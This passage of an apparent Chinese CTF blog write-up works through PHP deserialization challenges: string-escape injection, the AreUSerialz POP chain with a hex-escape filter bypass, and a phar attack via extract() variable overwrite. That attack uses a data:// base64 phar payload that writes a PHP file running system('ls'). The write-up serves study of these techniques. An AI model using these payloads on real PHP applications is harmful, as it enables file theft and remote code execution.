+<p>添加到PW的位置后我们发现 一个双引号后面直接来了个O有些突兀</p>
+<p>直接放到函数中进行生成</p>
+<pre><code class="language-php">&lt;?php
+class A{
+    public $username=&quot;UN&quot;;
+    public $password=&#39;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&#39;;
+   
+}
+echo serialize(new A)
+?&gt;
+</code></pre>
+<p>即为</p>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;UN&quot;;s:8:&quot;password&quot;;s:82:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&quot;;}
+</code></pre>
+<p>然后去考虑如何才能吃掉：</p>
+<p>替换规则是\0\0\0 替换为0*0 是六到三的替换</p>
+<p>也就是每一组替换可以吃掉3个长度的字符</p>
+<p>需要吃掉的内容：”;s:8:”password”;s:82:</p>
+<p>用python测一下长度</p>
+<pre><code class="language-php">&gt;&gt;&gt; len(&#39;&#39;&#39;&quot;;s:8:&quot;password&quot;;s:82:&#39;&#39;&#39;)
+22
+&gt;&gt;&gt; 22/3
+7.333333333333333
+</code></pre>
+<p>不是3的整数倍 所以需要自己添加值凑成3的倍数</p>
+<p>把前面的UN也吃掉就好了：UN”;s:8:”password”;s:82:</p>
+<p>然后继续利用python生成\0\0\0 共8组</p>
+<pre><code class="language-php">&gt;&gt;&gt; &#39;\0\0\0&#39;
+&#39;\x00\x00\x00&#39;
+&gt;&gt;&gt; &#39;\\0\\0\\0&#39;
+&#39;\\0\\0\\0&#39;
+&gt;&gt;&gt; &#39;\\0\\0\\0&#39; * 8
+&#39;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#39;
+&gt;&gt;&gt;
+</code></pre>
+<p>因为转义 所以双杠后自己替换一下就好了</p>
+<p>因为决定某个值的长度不是双引号的闭合 而是前面的数字</p>
+<p>所以把我们生成的替换字符放进去就会多读取后面的内容</p>
+<pre><code class="language-php">&lt;?php
+class A{
+    public $username=&#39;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&#39;;  //后面补充两个字符 因为24-22=2 去补充
+    public $password=&#39;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&#39;;
+   
+}
+echo serialize(new A)
+?&gt;
+</code></pre>
+<p>生成：</p>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:50:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&quot;;s:8:&quot;password&quot;;s:82:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&quot;;}
+</code></pre>
+<pre><code class="language-php">&gt;&gt;&gt; len(&#39;&#39;&#39;xx&quot;;s:8:&quot;password&quot;;s:82:&#39;&#39;&#39;)
+24
+&gt;&gt;&gt;正好是往后面读取24个
+</code></pre>
+<p>但此时出现的问题时 你自己补充了两个xx确实后面吃的个数是24但是属性值前面的50也是补充后的结果 6*8 = 48-&gt;24 那么虽然补充了两个xx 但是意味着需要往后读50-24 = 26个字符长度 故读取失败</p>
+<p>所以我们的补位不应该出现在这个属性值里面 而是在外面</p>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:50:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:82:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&quot;;}
+</code></pre>
+<pre><code class="language-php">&lt;?php
+class A{
+    public $username=&#39;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#39;;  
+    public $password=&#39;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&#39;;  //在这里的开头补充x&quot; 相当于补充了两位
+   
+}
+echo serialize(new A)
+?&gt;
+</code></pre>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:84:&quot;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;&quot;;}
+</code></pre>
+<p>此时往后读24</p>
+<pre><code class="language-php">&gt;&gt;&gt; len(&#39;&#39;&#39;&quot;;s:8:&quot;password&quot;;s:84:&quot;x&#39;&#39;&#39;)
+24
+</code></pre>
+<p>最终payload为：</p>
+<pre><code class="language-php">http://122.114.252.87:2030/?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}s:0:&quot;&quot;;s:0&quot;
+</code></pre>
+<p>url编码一下即可</p>
+<p>成功获取flag！：flag{a6c175ea-d851-5cf1-cd6f-3aad733ae896}</p>
+<hr>
+<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h6 id="例题：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#例题：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="例题：[网鼎杯 2020 青龙组]AreUSerialz"></a>例题：[网鼎杯 2020 青龙组]AreUSerialz</h6><h6 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h6><pre><code class="language-php"> &lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    }
+
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+
+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            }
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        } else {
+            $this-&gt;output(&quot;Failed!&quot;);
+        }
+    }
+
+    private function read() {
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) {
+            $res = file_get_contents($this-&gt;filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+}
+
+function is_valid($s) {
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{&#39;str&#39;})) {
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+}
+</code></pre>
+<p><strong>寻找pop链：</strong></p>
+<p>可以发现在read方法中存在file_get_contents函数，是可以利用获取flag的地方，所以需要我们调用read方法 可以发现在process方法中找到，就需要调用process方法并且需要op为2 所以construct方法中的无法使用，需要使用destruct方法，需要绕过他的强类型比较 将op设置为数字型的2 在强类型比较中字符型和数字型的2是不相等的 但在弱类型比较中是相等的 数字2就不加引号就可以了</p>
+<p><strong>绕过上传点的限制：</strong></p>
+<p>在is_valid函数中对ascii码进行一定检测，有限定范围 但是我们生成的序列化中存在\0字符，需要通过S的hex机制进行绕过检测</p>
+<pre><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op = 2;
+    protected $filename = &#39;flag.php&#39;;
+    protected $content;
+
+    // function __construct() {
+    //     $op = &quot;1&quot;;
+    //     $filename = &quot;/tmp/tmpfile&quot;;
+    //     $content = &quot;Hello World!&quot;;
+    //     $this-&gt;process();
+    // }
+
+    // public function process() {
+    //     if($this-&gt;op == &quot;1&quot;) {
+    //         $this-&gt;write();
+    //     } else if($this-&gt;op == &quot;2&quot;) {
+    //         $res = $this-&gt;read();
+    //         $this-&gt;output($res);
+    //     } else {
+    //         $this-&gt;output(&quot;Bad Hacker!&quot;);
+    //     }
+    // }
+
+    // private function write() {
+    //     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+    //         if(strlen((string)$this-&gt;content) &gt; 100) {
+    //             $this-&gt;output(&quot;Too long!&quot;);
+    //             die();
+    //         }
+    //         $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+    //         if($res) $this-&gt;output(&quot;Successful!&quot;);
+    //         else $this-&gt;output(&quot;Failed!&quot;);
+    //     } else {
+    //         $this-&gt;output(&quot;Failed!&quot;);
+    //     }
+    // }
+
+    // private function read() {
+    //     $res = &quot;&quot;;
+    //     if(isset($this-&gt;filename)) {
+    //         $res = file_get_contents($this-&gt;filename);
+    //     }
+    //     return $res;
+    // }
+
+    // private function output($s) {
+    //     echo &quot;[Result]: &lt;br&gt;&quot;;
+    //     echo $s;
+    // }
+
+    // function __destruct() {
+    //     if($this-&gt;op === &quot;2&quot;)
+    //         $this-&gt;op = &quot;1&quot;;
+    //     $this-&gt;content = &quot;&quot;;
+    //     $this-&gt;process();
+    // }
+
+}
+
+// echo urlencode(serialize(new FileHandler));
+// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D
+// 因为上传的时候存在检测ascii码存在一定的范围
+
+$ser = serialize(new FileHandler);
+
+echo $ser;
+echo &quot;\n&quot;;
+
+function decorate($s){
+    $arr = explode(&#39;:&#39;,$s);
+    for($i = 0; $i &lt; count($arr); $i++){
+        if(strpos($arr[$i],&quot;\0&quot;) != false){
+            echo $arr[$i].&quot;\n&quot;;
+            echo $arr[$i-2].&quot;\n&quot;;
+        }
+    }
+}
+
+decorate($ser);
+
+
+
+// function is_valid($s) {
+//     for($i = 0; $i &lt; strlen($s); $i++)
+//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+//             return false;
+//     return true;
+// }
+
+// if(isset($_GET{&#39;str&#39;})) {
+
+//     $str = (string)$_GET[&#39;str&#39;];
+//     if(is_valid($str)) {
+//         $obj = unserialize($str);
+//     }
+
+// }
+</code></pre>
+<p>发现确实找到了小s 然后再写一个字符替换</p>
+<pre><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op = 2;
+    protected $filename = &#39;flag.php&#39;;
+    protected $content;
+
+    // function __construct() {
+    //     $op = &quot;1&quot;;
+    //     $filename = &quot;/tmp/tmpfile&quot;;
+    //     $content = &quot;Hello World!&quot;;
+    //     $this-&gt;process();
+    // }
+
+    // public function process() {
+    //     if($this-&gt;op == &quot;1&quot;) {
+    //         $this-&gt;write();
+    //     } else if($this-&gt;op == &quot;2&quot;) {
+    //         $res = $this-&gt;read();
+    //         $this-&gt;output($res);
+    //     } else {
+    //         $this-&gt;output(&quot;Bad Hacker!&quot;);
+    //     }
+    // }
+
+    // private function write() {
+    //     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+    //         if(strlen((string)$this-&gt;content) &gt; 100) {
+    //             $this-&gt;output(&quot;Too long!&quot;);
+    //             die();
+    //         }
+    //         $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+    //         if($res) $this-&gt;output(&quot;Successful!&quot;);
+    //         else $this-&gt;output(&quot;Failed!&quot;);
+    //     } else {
+    //         $this-&gt;output(&quot;Failed!&quot;);
+    //     }
+    // }
+
+    // private function read() {
+    //     $res = &quot;&quot;;
+    //     if(isset($this-&gt;filename)) {
+    //         $res = file_get_contents($this-&gt;filename);
+    //     }
+    //     return $res;
+    // }
+
+    // private function output($s) {
+    //     echo &quot;[Result]: &lt;br&gt;&quot;;
+    //     echo $s;
+    // }
+
+    // function __destruct() {
+    //     if($this-&gt;op === &quot;2&quot;)
+    //         $this-&gt;op = &quot;1&quot;;
+    //     $this-&gt;content = &quot;&quot;;
+    //     $this-&gt;process();
+    // }
+
+}
+
+// echo urlencode(serialize(new FileHandler));
+// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D
+// 因为上传的时候存在检测ascii码存在一定的范围
+
+$ser = serialize(new FileHandler);
+
+echo $ser;
+echo &quot;\n&quot;;
+
+function decorate($s){
+    $arr = explode(&#39;:&#39;,$s);
+    for($i = 0; $i &lt; count($arr); $i++){
+        if(strpos($arr[$i],&quot;\0&quot;) != false){
+            echo $arr[$i].&quot;\n&quot;;
+            echo $arr[$i-2].&quot;\n&quot;;
+            $arr[$i-2] = str_replace(&#39;s&#39;,&#39;S&#39;,$arr[$i-2]);
+            $arr[$i] = str_replace(&quot;\0&quot;,&#39;\00&#39;,$arr[$i]); //注意区分单引号双引号
+            echo &quot;替换后:&quot;.$arr[$i].&quot;\n&quot;;
+            echo &quot;替换后:&quot;.$arr[$i-2].&quot;\n&quot;;
+        }
+    }
+    //拼接回来
+    return join(&#39;:&#39;,$arr);
+}
+
+echo decorate($ser);
+
+
+
+// function is_valid($s) {
+//     for($i = 0; $i &lt; strlen($s); $i++)
+//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+//             return false;
+//     return true;
+// }
+
+// if(isset($_GET{&#39;str&#39;})) {
+
+//     $str = (string)$_GET[&#39;str&#39;];
+//     if(is_valid($str)) {
+//         $obj = unserialize($str);
+//     }
+
+// }
+</code></pre>
+<p>输出：</p>
+<pre><code class="language-php">O:11:&quot;FileHandler&quot;:3:{s:5:&quot; * op&quot;;i:2;s:11:&quot; * filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot; * content&quot;;N;}
+&quot; * op&quot;;i
+{s
+替换后:&quot;\00*\00op&quot;;i
+替换后:{S
+&quot; * filename&quot;;s
+2;s
+替换后:&quot;\00*\00filename&quot;;s
+替换后:2;S
+&quot; * content&quot;;N;}
+&quot;flag.php&quot;;s
+替换后:&quot;\00*\00content&quot;;N;}
+替换后:&quot;flag.php&quot;;S
+O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;}
+</code></pre>
+<p>之所以会产生这些不可见0字符 是因为protected和private属性的原因导致 所以需要我们进行替换</p>
+<p>传入后查看页面源代码成功获取flag：</p>
+<p><img src="/assets/17476574315877288923840810046356-20250519202352-rzwpee6.png" alt="17476574315877288923840810046356"></p>
+<p>同时这道题目也可以装瞎 把protected的属性改成public进行攻击</p>
+<p>但是当时这道题目在读取文件<strong>析构函数切目录</strong>的时候不在当前目录 需要获取其绝对路径进行读取</p>
+<pre><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    public $op = 2;
+    public $filename = &#39;/proc/self/cmdline&#39;;
+    public $content;
+
+}
+
+$ser = serialize(new FileHandler);
+echo $ser;
+</code></pre>
+<p>第二种方法 提前结束 快速析构</p>
+<p>把属性值修改</p>
+<p>​<code>O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code>​</p>
+<p>改为</p>
+<p>​<code>O:11:&quot;FileHandler&quot;:4:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code>​</p>
+<p>或者删除结尾的大括号</p>
+<p>​<code>O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;</code>​</p>
+<p>‍</p>
+<h2 id="phar例题："><a href="#phar例题：" class="headerlink" title="phar例题："></a>phar例题：</h2><p><strong>X-NUCA 2020 Final</strong></p>
+<ol>
+<li>变量覆盖读template.php</li>
+<li>变量覆盖写入无损phar文件</li>
+<li>变量覆盖触发phar反序列化</li>
+</ol>
+<p>题目：</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(E_ALL);
+$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+if(!is_dir($sandbox)) {
+    mkdir($sandbox);
+}
+
+include_once(&#39;template.php&#39;);
+
+//                key     value
+$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
+
+
+//看似多余的东西往往是解题的关键
+if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
+    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
+} else {
+    highlight_file(__file__);
+    die();
+}
+
+if(isset($_GET[&#39;tp&#39;])) {
+    $tp = $_GET[&#39;tp&#39;];
+       //  判断tp是否为template中的key
+    if (array_key_exists($tp, $template) === FALSE) {
+        echo &quot;No! You only have 3 template to reader&quot;;
+        die();
+    }
+    //读取文件
+    $content = file_get_contents($template[$tp]);
+    $temp = new Template($content);
+} else {
+    echo &quot;Please choice one template to reader&quot;;
+}
+?&gt; 
+</code></pre>
+<p><strong>小技巧：</strong>  在源代码中看似没有一点用处的东西可能会成为解题的关键 比如在这里面存在着extract方法，可以用于变量覆盖</p>
+<p>分析题目我们发现 想要读取文件 只能是在template数组中进行读取 但是其内容已经写好固定了，所以需要我们对template数组进行变量覆盖</p>
+<p>对var数组进行操作 去读取template.php文件的内容</p>
+<p>key value</p>
+<p>array(‘template’ =&gt; array(‘tp1’ =&gt; ‘template.php’))</p>
+<p>把template数组中的tp1这个key 的 value换成 template.php</p>
+<p>即传参<code>?var[template][tp1]=template.php</code>​</p>
+<p><img src="/assets/17476580781468024852844359025089-20250519203439-s946w93.png" alt="17476580781468024852844359025089"></p>
+<p>对upload后面的开始访问：<a href="http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html">http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html</a></p>
+<p>得到一段php代码</p>
+<pre><code class="language-php">&lt;?php
+class Template{
+	public $content;
+	public $pattern;
+	public $suffix;
+
+	public function __construct($content){
+		$this-&gt;content = $content;
+		$this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+		$this-&gt;suffix = &quot;.html&quot;;
+	}
+
+	public function __destruct() {
+		$this-&gt;render();
+	}
+	public function render() {
+        //必须利用里面的break跳出死循环 才能到危险函数
+		while (True) {
+			if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
+				break;
+			global ${$matches[1]};
+			
+			if(isset(${$matches[1]})) {
+				$this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
+			} 
+			else{
+				break;
+			}
+		}
+        //suffic的长度必须大于5
+		if(strlen($this-&gt;suffix)&gt;5) {
+			echo &quot;error suffix&quot;;
+			die();
+		}
+		$filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
+        //危险函数 需要走过来嗷
+		file_put_contents($filename, $this-&gt;content);
+		echo &quot;Your html file is in &quot; . $filename;
+	}
+}
+
+?&gt;
+</code></pre>
+<p>因为在这个类中存在获取文件的方法 但是没有反序列化的途径 所以很明显嗷 这是个<strong>phar</strong>的问题</p>
+<p>根据phar的条件进行解题探索</p>
+<p>file_put_contents： phar可利用的函数</p>
+<p>先构造pop链生成phar文件</p>
+<p>本地测试时注意修改我们的php.ini的配置文件</p>
+<p> <img src="/assets/17476581091664899805473643872117-20250519203510-1ovs32j.png" alt="17476581091664899805473643872117"></p>
+<p>避大坑！！！！ 可能我们修改了之后 但是在vscode中无法操作成功 原因在于版本不匹配</p>
+<p>姿势1：修改ini之后 直接在本地访问该网页 然后就会在同级目录生成对应文件</p>
+<p>姿势2：在cmd中输入<code>php -v</code>​查看一下电脑环境的默认php版本</p>
+<p><img src="/assets/17476581185514129733610710164602-20250519203519-4vcfew4.png" alt="17476581185514129733610710164602"></p>
+<p>然后在phpStudy中修改对于版本的ini文件进行访问</p>
+<p>想要file_get_contents读取到我们的phar.phar的内容有两种方法：</p>
+<ol>
+<li>file_get_contents可以发起http请求 只需要我们把phar文件写到服务器上就可以</li>
+<li>file_get_contents读取data:&#x2F;&#x2F;协议</li>
+</ol>
+<p><strong>data:&#x2F;&#x2F;的使用方式：</strong></p>
+<p>首先构造好反序列化的payload 然后在尾部添加上phar的八股文</p>
+<pre><code class="language-php">&lt;?php
+class Template{
+	public $content = &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot;;
+	public $pattern;
+	public $suffix = &quot;.php&quot;;
+
+}
+$o = new Template();
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();  
+
+?&gt; 
+</code></pre>
+<p>这样执行成功后会在本地生成一个phar的文件</p>
+<p>然后我们读取里面的信息</p>
+<pre><code class="language-php">&lt;?php
+$ph = file_get_contents(&#39;phar.phar&#39;);
+echo $ph.&quot;\n&quot;;   //很多乱码 所以用base64加密一下
+echo base64_encode($ph);
+?&gt;
+</code></pre>
+<p>out：</p>
+<pre><code class="language-php">GIF89a&lt;?php __HALT_COMPILER(); ?&gt;
+�fO:8:&quot;Template&quot;:3:{s:7:&quot;content&quot;;s:21:&quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot;;s:7:&quot;pattern&quot;;N;s:6:&quot;suffix&quot;;s:4:&quot;.php&quot;;}test.txty�d~ضtest�jKn&#39; Ii�Fi۶� ޅF�GBMB
+R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=
+</code></pre>
+<p>data读取：</p>
+<p>​<code>data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</code>​</p>
+<p>那么现在我们如何让题目所在服务器读取我们的data？可以回想到该题目的第一个界面</p>
+<p>我们使用<strong>变量覆盖的方法读取</strong>内容 ！！注意嗷 一定要url编码一下哈</p>
+<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CR0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5%2F2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI%3D&amp;tp=tp1</code>​</p>
+<p><img src="/assets/17476582446048249458991917343755-20250519203725-ec9ermw.png" alt="17476582446048249458991917343755"></p>
+<p>写入成功</p>
+<p><img src="/assets/17476582583645402199081299806411-20250519203739-x9hipvl.png" alt="17476582583645402199081299806411"></p>
+<p><strong>触发phar：</strong></p>
+<p>​<code>phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/6c50d8d7eaa92dc4998351838da62dcc.html</code>​继续使用刚刚的file_get_contents函数加变量覆盖进行读取</p>
+<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fuploads%2F7cddc639132e5953bf969cc3c9b08fd7%2F6c50d8d7eaa92dc4998351838da62dcc.html&amp;tp=tp1</code><img src="/assets/17476582766138360737958902537856-20250519203759-qo996jy.png" alt="17476582766138360737958902537856"></p>
+<p>执行成功 成功获得php后缀</p>
+<p>因为我的命令是ls 所以访问后结果是列出的内容</p>
+<p><strong>测试phpinfo</strong></p>
+<pre><code class="language-php">&lt;?php
+class Template{
+	public $content = &quot;&lt;?php phpinfo();?&gt;&quot;;
+	public $pattern;
+	public $suffix = &quot;.php&quot;;
+
+}
+$o = new Template();
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();  
+
+?&gt; 
+</code></pre>
+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&amp;tp=tp1</a></p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;2d867d52da656654f238ad3f2eceda1d.html</p>
